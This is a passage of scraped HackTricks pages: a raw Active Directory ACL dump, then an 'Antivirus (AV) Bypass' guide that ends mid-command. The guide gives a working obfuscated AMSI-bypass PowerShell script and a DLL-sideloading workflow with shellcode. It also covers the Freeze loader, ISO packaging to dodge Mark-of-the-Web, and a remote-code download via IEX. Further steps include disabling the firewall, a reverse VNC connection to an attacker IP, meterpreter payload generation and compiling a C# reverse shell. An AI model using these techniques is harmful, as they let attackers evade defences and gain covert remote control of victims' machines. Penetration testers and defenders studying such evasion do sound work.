1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)\"\n‚Äã\nOwner            : BUILTIN\\Administrators\nGroup\n: BUILTIN\\Administrators\nDiscretionaryAcl :\n{\nEveryone: AccessDenied\n(\nWriteData\n),\nEveryone: AccessAllowed\n(\nWriteExtendedAttributes\n),\nNT\nAUTHORITY\\ANONYMOUS LOGON: AccessAllowed\n(\nCreateDirectories\n,\nGenericExecute\n,\nReadPermissions\n,\nTraverse\n,\nWriteExtendedAttributes\n),\nNT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed\n(\nCreateDirectories\n,\nGenericExecute\n,\nGenericRead\n,\nReadAttributes\n,\nReadPermissions\n,\nWriteExtendedAttributes\n)...}\nSystemAcl        :\n{\nEveryone: SystemAudit SuccessfulAccess\n(\nChangePermissions\n,\nTakeOwnership\n,\nTraverse\n),\nBUILTIN\\Administrators: SystemAudit SuccessfulAccess\n(\nWriteAttributes\n),\nDOMAIN_NAME\\Domain Users:\nSystemAudit SuccessfulAccess\n(\nWriteAttributes\n),\nEveryone: SystemAudit SuccessfulAccess\n(\nTraverse\n)...}\nRawDescriptor    : System\n.\nSecurity\n.\nAccessControl\n.\nCommonSecurityDescriptor\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWindows Hardening -\nPrevious\nBasic Win CMD for Pentesters\nNext\nPowerView/SharpView\nLast modified\n2mo ago"
    },
    {
        "title": "Antivirus (AV) Bypass",
        "url": "https://book.hacktricks.xyz/windows-hardening/av-bypass",
        "text": "Antivirus (AV) Bypass\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nThis page was written by\n@m2rc_p\n!\nAV Evasion Methodology\nCurrently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.\nStatic detection\nStatic detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:\nEncryption\nIf you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.\nObfuscation\nSometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.\nCustom tooling\nIf you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.\nA good way for checking against Windows Defender static detection is\nThreatCheck\n. It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.\nI highly recommend you check out this\nYouTube playlist\nabout practical AV Evasion.\nDynamic analysis\nDynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.\nSleep before execution\nDepending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.\nChecking machine's resources\nUsually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.\nMachine-specific checks\nIf you want to target a user who's workstation is joined to the \"contoso.local\" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.\nIt turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.\nsource:\nhttps://youtu.be/StSLxFbVz0M?t=1439\n‚Äã\nSome other really good tips from\n@mgeeky\nfor going against Sandboxes\n‚Äã\nRed Team VX Discord\n#malware-dev channel\nAs we've said before in this post,\npublic tools\nwill eventually\nget detected\n, so, you should ask yourself something:\nFor example, if you want to dump LSASS,\ndo you really need to use mimikatz\n? Or could you use a different project which is lesser known and also dumps LSASS.\nThe right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.\nWhen modifying your payloads for evasion, make sure to\nturn off automatic sample submission\nin defender, and please, seriously,\nDO NOT UPLOAD TO VIRUSTOTAL\nif your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.\nEXEs vs DLLs\nWhenever it's possible, always\nprioritize using DLLs for evasion\n, in my experience, DLL files are usually\nway less detected\nand analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).\nAs we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.\nantiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL\nNow we'll show some tricks you can use with DLL files to be much more stealthier.\nDLL Sideloading & Proxying\nDLL Sideloading\ntakes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.\nYou can check for programs susceptible to DLL Sideloading using\nSiofra\nand the following powershell script:\nGet-ChildItem\n-\nPath\n\"C:\\Program Files\\\"\n-\nFilter\n*\n.\nexe\n-\nRecurse\n-\nFile\n-\nName\n|\nForEach-Object\n{\n$binarytoCheck\n=\n\"C:\\Program Files\\\"\n+\n$_\nC:\\Users\\user\\Desktop\\Siofra64\n.\nexe\n--\nmode file-scan\n--\nenum-dependency\n--\ndll-hijack\n-\nf\n$binarytoCheck\n}\nThis command will output the list of programs susceptible to DLL hijacking inside \"C:\\Program Files\\\" and the DLL files they try to load.\nI highly recommend you\nexplore DLL Hijackable/Sideloadable programs yourself\n, this technique is pretty stealthy done properly, but if you use publicly known DLL Sideloadable programs, you may get caught easily.\nJust by placing a malicious DLL with the name a program expects to load, won't load your payload, as the program expects some specific functions inside that DLL, to fix this issue, we'll use another technique called\nDLL Proxying/Forwarding\n.\nDLL Proxying\nforwards the calls a program makes from the proxy (and malicious) DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your payload.\nI will be using the\nSharpDLLProxy\nproject from\n@flangvik\n‚Äã\nThese are the steps I followed:\n1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)\n2. Generate some shellcode (I used Havoc C2)\n3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)\n4. Use SharpDLLProxy to create the proxy dll (.\\SharpDllProxy.exe --dll .\\mimeTools.dll --payload .\\demon.bin)\nThe last command will give us 2 files: a DLL source code template, and the original renamed DLL.\n5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.\nThese are the results:\nBoth our shellcode (encoded with\nSGN\n) and the proxy DLL have a 0/26 Detection rate in\nantiscan.me\n! I would call that a success.\nI\nhighly recommend\nyou watch\nS3cur3Th1sSh1t's twitch VOD\nabout DLL Sideloading and also\nippsec's video\nto learn more about what we've discussed more in-depth.\n‚Äã\nFreeze\n‚Äã\nFreeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods\nYou can use Freeze to load and execute your shellcode in a stealthy manner.\nGit clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)\n1. Generate some shellcode, in this case I used Havoc C2.\n2. ./Freeze -I demon.bin -encrypt -O demon.exe\n3. Profit, no alerts from defender\nEvasion is just a cat & mouse game, what works today could be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.\nAMSI (Anti-Malware Scan Interface)\nAMSI was created to prevent \"\nfileless malware\n\". Initially, AVs were only capable of scanning\nfiles on disk\n, so if you could somehow execute payloads\ndirectly in-memory\n, the AV couldn't do anything to prevent it, as it didn't have enough visibility.\nThe AMSI feature is integrated into these components of Windows.\nUser Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)\nPowerShell (scripts, interactive use, and dynamic code evaluation)\nWindows Script Host (wscript.exe and cscript.exe)\nJavaScript and VBScript\nOffice VBA macros\nIt allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.\nRunning\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')\nwill produce the following alert on Windows Defender.\nNotice how it prepends\namsi:\nand then the path to the executable from which the script ran, in this case, powershell.exe\nWe didn't drop any file to disk, but still got caught in-memory because of AMSI.\nThere are a couple of ways to get around AMSI:\nObfuscation\nSince AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.\nHowever, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.\nAMSI Bypass\nSince AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.\nForcing an Error\nForcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by\nMatt Graeber\nand Microsoft has developed a signature to prevent wider usage.\n[Ref]\n.\nAssembly\n.\nGetType\n(\n'System.Management.Automation.AmsiUtils'\n).\nGetField\n(\n'amsiInitFailed'\n,\n'NonPublic,Static'\n).\nSetValue\n(\n$null\n,\n$true\n)\nAll it took was one line of powershell code to render AMSI unusable for the current powershell process. This line has of course been flagged by AMSI itself, so some modification is needed in order to use this technique.\nHere is a modified AMSI bypass I took from this\nGithub Gist\n.\nTry\n{\n#Ams1 bypass technic n¬∫ 2\n$Xdatabase\n=\n'Utils'\n;\n$Homedrive\n=\n'si'\n$ComponentDeviceId\n=\n\"N`onP\"\n+\n\"ubl`ic\"\n-join\n''\n$DiskMgr\n=\n'\n[email¬†protected]\n√Ç¬£n√Ç¬£g'\n+\n'e@+nt.Auto@'\n+\n'√Ç¬£tion.A'\n-join\n''\n$fdx\n=\n'@ms'\n+\n'√Ç¬£In√Ç¬£'\n+\n'tF@√Ç¬£'\n+\n'l+d'\n-Join\n''\n;\nStart-Sleep\n-\nMilliseconds 300\n$CleanUp\n=\n$DiskMgr\n.\nReplace\n(\n'@'\n,\n'm'\n).\nReplace\n(\n'√Ç¬£'\n,\n'a'\n).\nReplace\n(\n'+'\n,\n'e'\n)\n$Rawdata\n=\n$fdx\n.\nReplace\n(\n'@'\n,\n'a'\n).\nReplace\n(\n'√Ç¬£'\n,\n'i'\n).\nReplace\n(\n'+'\n,\n'e'\n)\n$SDcleanup\n=\n[Ref]\n.\nAssembly\n.\nGetType\n((\n'{0}m{1}{2}'\n-\nf\n$CleanUp\n,\n$Homedrive\n,\n$Xdatabase\n))\n$Spotfix\n=\n$SDcleanup\n.\nGetField\n(\n$Rawdata\n,\n\"\n$ComponentDeviceId\n,Static\"\n)\n$Spotfix\n.\nSetValue\n(\n$null\n,\n$true\n)\n}\nCatch\n{\nThrow\n$_\n}\nKeep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.\nMemory Patching\nThis technique was initially discovered by\n@RastaMouse\nand it involves finding address for the \"AmsiScanBuffer\" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.\nPlease read\nhttps://rastamouse.me/memory-patching-amsi-bypass/\nfor a more detailed explanation.\nThere are also many other techniques used to bypass AMSI with powershell, check out\nthis page\nand\nthis repo\nto learn more about them.\nObfuscation\nThere are several tools that can be used to\nobfuscate C# clear-text code\n, generate\nmetaprogramming templates\nto compile binaries or\nobfuscate compiled binaries\nsuch as:\n‚Äã\nInvisibilityCloak\n: C# obfuscator\n‚Äã\nObfuscator-LLVM\n: The aim of this project is to provide an open-source fork of the\nLLVM\ncompilation suite able to provide increased software security through\ncode obfuscation\nand tamper-proofing.\n‚Äã\nADVobfuscator\n: ADVobfuscator demonstates how to use\nC++11/14\nlanguage to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.\n‚Äã\nobfy\n: Add a layer of obfuscated operations generated by the C++ template metaprogramming framework which will make the life of the person wanting to crack the application a little bit harder.\n‚Äã\nAlcatraz\n:\nAlcatraz is a x64 binary obfuscator that is able to obfuscate various different pe files including: .exe, .dll, .sys\n‚Äã\nmetame\n: Metame is a simple metamorphic code engine for arbitrary executables.\n‚Äã\nropfuscator\n: ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.\n‚Äã\nNimcrypt\n: Nimcrypt is a .NET PE Crypter written in Nim\n‚Äã\ninceptor\n:\nInceptor is able to convert existing EXE/DLL into shellcode and then load them\nSmartScreen & MoTW\nYou may have seen this screen when downloading some executables from the internet and executing them.\nMicrosoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.\nSmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).\nMoTW\n(Mark of The Web) is an\nNTFS Alternate Data Stream\nwith the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.\nChecking the Zone.Identifier ADS for a file downloaded from the internet.\nIt's important to note that executables signed with a\ntrusted\nsigning certificate\nwon't trigger SmartScreen\n.\nA very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW)\ncannot\nbe applied to\nnon NTFS\nvolumes.\n‚Äã\nPackMyPayload\nis a tool that packages payloads into output containers to evade Mark-of-the-Web.\nExample usage:\nPS\nC:\\Tools\\PackMyPayload> python\n.\n\\PackMyPayload\n.\npy\n.\n\\TotallyLegitApp\n.\nexe container\n.\niso\n‚Äã\n+\no\n+\no\n+\no\n+\no\n+\no\n+\n+\no\n+\n+\no\n+\n+\n+\no\n+\n+\no\n-\n_-^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n^\n-\n_-_-_-_-_-_-_\n,\n------\n,\no\n:: PACK MY PAYLOAD\n(\n1\n.\n1\n.\n0\n)\n-\n_-_-_-_-_-_-\n|\n/\n\\_/\\\nfor\nall your container cravings\n-\n_-_-_-_-_-~\n|\n__\n(\n^\n.\n^\n)\n+\n+\n-\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-\n''\n''\n+\no         o\n+\no\n+\no         o\n+\no\n+\no\n+\no    ~   Mariusz Banach\n/\nmgeeky    o\no      ~\n+\n~          <mb\n[at]\nbinary-offensive\n.\ncom>\no\n+\no\n+\n+\n‚Äã\n[.]\nPackaging input file to output\n.\niso\n(\niso\n)...\nBurning file onto ISO:\nAdding file:\n/\nTotallyLegitApp\n.\nexe\n‚Äã\n[\n+\n]\nGenerated file written to\n(\nsize: 3420160\n)\n: container\n.\niso\nHere is a demo for bypassing SmartScreen by packaging payloads inside ISO files using\nPackMyPayload\n‚Äã\nC# Assembly Reflection\nLoading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.\nSince the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.\nMost C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:\nFork&Run\nIt involves\nspawning a new sacrificial process\n, inject your post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process. This has both its benefits and its drawbacks. The benefit to the fork and run method is that execution occurs\noutside\nour Beacon implant process. This means that if something in our post-exploitation action goes wrong or gets caught, there is a\nmuch greater chance\nof our\nimplant surviving.\nThe drawback is that you have a\ngreater chance\nof getting caught by\nBehavioural Detections\n.\nInline\nIt's about injecting the post-exploitation malicious code\ninto its own process\n. This way, you can avoid having to create a new process and getting it scanned by AV, but the drawback is that if something goes wrong with the execution of your payload, there's a\nmuch greater chance\nof\nlosing your beacon\nas it could crash.\nIf you want to read more about C# Assembly loading, please check out this article\nhttps://securityintelligence.com/posts/net-execution-inlineexecute-assembly/\nand their InlineExecute-Assembly BOF (\nhttps://github.com/xforcered/InlineExecute-Assembly\n)\nYou can also load C# Assemblies\nfrom PowerShell\n, check out\nInvoke-SharpLoader\nand\nS3cur3th1sSh1t's video\n.\nUsing Other Programming Languages\nAs proposed in\nhttps://github.com/deeexcee-io/LOI-Bins\n, it's possible to execute malicious code using other languages by giving the compromised machine access\nto the interpreter environment installed on the Attacker Controlled SMB share\n.\nBy allowing access to the Interpreter Binaries and the environment on the SMB share you can\nexecute arbitrary code in these languages within memory\nof the compromised machine.\nThe repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have\nmore flexibility to bypass static signatures\n. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.\nAdvanced Evasion\nEvasion is a very complicated topic, sometimes you have to take into account many different sources of telemetry in just one system, so it's pretty much impossible to stay completely undetected in mature environments.\nEvery environment you go against will have their own strengths and weaknesses.\nI highly encourage you go watch this talk from\n@ATTL4S\n, to get a foothold into more Advanced Evasion techniques.\nhis is also another great talk from\n@mariuszbit\nabout Evasion in Depth.\nOld Techniques\nTelnet Server\nUntil Windows10, all Windows came with a\nTelnet server\nthat you could install (as administrator) doing:\npkgmgr /iu:\"TelnetServer\" /quiet\nMake it\nstart\nwhen the system is started and\nrun\nit now:\nsc config TlntSVR start= auto obj= localsystem\nChange telnet port\n(stealth) and disable firewall:\ntlntadmn config port=80\nnetsh advfirewall set allprofiles state off\nUltraVNC\nDownload it from:\nhttp://www.uvnc.com/downloads/ultravnc.html\n(you want the bin downloads, not the setup)\nON THE HOST\n: Execute\nwinvnc.exe\nand configure the server:\nEnable the option\nDisable TrayIcon\nSet a password in\nVNC Password\nSet a password in\nView-Only Password\nThen, move the binary\nwinvnc.exe\nand\nnewly\ncreated file\nUltraVNC.ini\ninside the\nvictim\nReverse connection\nThe\nattacker\nshould\nexecute inside\nhis\nhost\nthe binary\nvncviewer.exe -listen 5900\nso it will be\nprepared\nto catch a reverse\nVNC connection\n. Then, inside the\nvictim\n: Start the winvnc daemon\nwinvnc.exe -run\nand run\nwinwnc.exe [-autoreconnect] -connect <attacker_ip>::5900\nWARNING:\nTo maintain stealth you must not do a few things\nDon't start\nwinvnc\nif it's already running or you'll trigger a\npopup\n. check if it's running with\ntasklist | findstr winvnc\nDon't start\nwinvnc\nwithout\nUltraVNC.ini\nin the same directory or it will cause\nthe config window\nto open\nDon't run\nwinvnc -h\nfor help or you'll trigger a\npopup\n‚Äã\nGreatSCT\nDownload it from:\nhttps://github.com/GreatSCT/GreatSCT\n‚Äã\ngit clone https://github.com/GreatSCT/GreatSCT.git\ncd GreatSCT/setup/\n./setup.sh\ncd ..\n./GreatSCT.py\nInside GreatSCT:\nuse 1\nlist #Listing available payloads\nuse 9 #rev_tcp.py\nset lhost 10.10.14.0\nsel lport 4444\ngenerate #payload is the default name\n#This will generate a meterpreter xml and a rcc file for msfconsole\nNow\nstart the lister\nwith\nmsfconsole -r file.rc\nand\nexecute\nthe\nxml payload\nwith:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe payload.xml\nCurrent defender will terminate the process very fast.\nCompiling our own reverse shell\nhttps://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15\nFirst C# Revershell\nCompile it with:\nc:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /t:exe /out:back2.exe C:\\Users\\Public\\Documents\\Back1.cs.txt\nUse it with:\nback.exe <ATTACKER_IP> 